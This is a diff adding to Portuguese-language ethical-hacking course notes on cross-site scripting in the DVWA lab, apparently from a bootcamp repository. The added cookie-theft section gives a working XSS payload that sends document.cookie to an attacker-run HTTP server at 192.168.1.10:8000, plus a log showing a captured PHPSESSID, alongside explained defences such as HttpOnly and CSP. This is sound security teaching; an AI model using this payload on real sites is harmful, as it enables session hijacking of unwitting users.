@@ -36,7 +36,7 @@
 * **Self-XSS:** engenharia social para a própria vítima colar código no console (não é falha do site).
 * **UXSS:** exploração de bug no navegador/extensão, menos comum, alto impacto.
 
-## Relected XSS
+## XSS Relected 
 
 Com o uso do DVWA do metasploit, exploraremos a vunerabidade em reflected XSS, começando pelo nível baixo de segurança.
 
@@ -79,4 +79,47 @@ O JavaScript é executado
 ![Resposta](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_04.png)
 
 ## Roubo de Cookie
+
+Neste exercício, o objetivo é roubar o cookie de sessão do usuário.
+
+**1.** Iniciar um servidor HTTP simples que serve os arquivos do diretório atual na porta 8000. Útil para testes rápidos (abrir no navegador http://<ip>:8000/ e ver/listar arquivos).
+```
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Ele inicia 
+**2.** Injetar na página o comando:
+
+`<script>document.write('<img src="http://192.168.1.10:8000/' + document.cookie + ' ">');</script>`
+
+Esse snippet tenta exfiltrar cookies via uma requisição de imagem — um padrão clássico usado em XSS.
+
+**Explicação do script**
+- document.cookie → retorna, como string, todos os cookies acessíveis por JavaScript do site atual (ex.: nome1=valor1; nome2=valor2). Cookies com HttpOnly não aparecem aqui.
+- document.write(...) → injeta no HTML da página uma tag <img> construída dinamicamente.
+- <img src="http://192.168.1.10:8000/ + cookies + "> → o navegador tenta carregar essa imagem, fazendo um HTTP GET para 192.168.1.10:8000 com o valor dos cookies no caminho da URL (o espaço final vira %20).
+- Mesmo que a imagem dê 404, o request sai do navegador; quem controla 192.168.1.10:8000 consegue ver/registrar os cookies nos logs do servidor.
+
+**Perigo**
+
+- Em um cenário de XSS (Reflected/Stored), o código roda no contexto do domínio da vítima. Se os cookies de sessão não tiverem HttpOnly, o invasor pode roubar a sessão colocando esses valores na URL e recebendo-os no servidor dele.
+
+**Limitações e defesas**
+
+- HttpOnly no cookie de sessão impede que document.cookie o leia (mitiga “cookie stealing”, embora XSS ainda permita ações em nome do usuário).
+- CSP bem configurada (ex.: bloquear scripts inline e img-src para domínios não autorizados) barra a criação desse <img> externo.
+- Escapar/sanitizar por contexto toda saída baseada em entrada do usuário evita a execução do script (previne XSS).
+- HTTPS + Secure + HSTS, SameSite, escopo mínimo de Domain/Path e, se possível, prefixos __Host-/__Secure- reforçam a proteção de sessão.
+- Evite document.write e “sinks” inseguros (innerHTML, etc.) com dados não confiáveis.
+
+**3.** Resultado
+```
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.1.10 - - [12/Sep/2025 22:49:41] code 404, message File not found
+192.168.1.10 - - [12/Sep/2025 22:49:41] "GET /security=medium;%20PHPSESSID=ccfafaeac102b3811d58970bd22e889c HTTP/1.1" 404 -
+```
+É obtido o ID da sessão do usuário!
+
+## XSS Stored
 
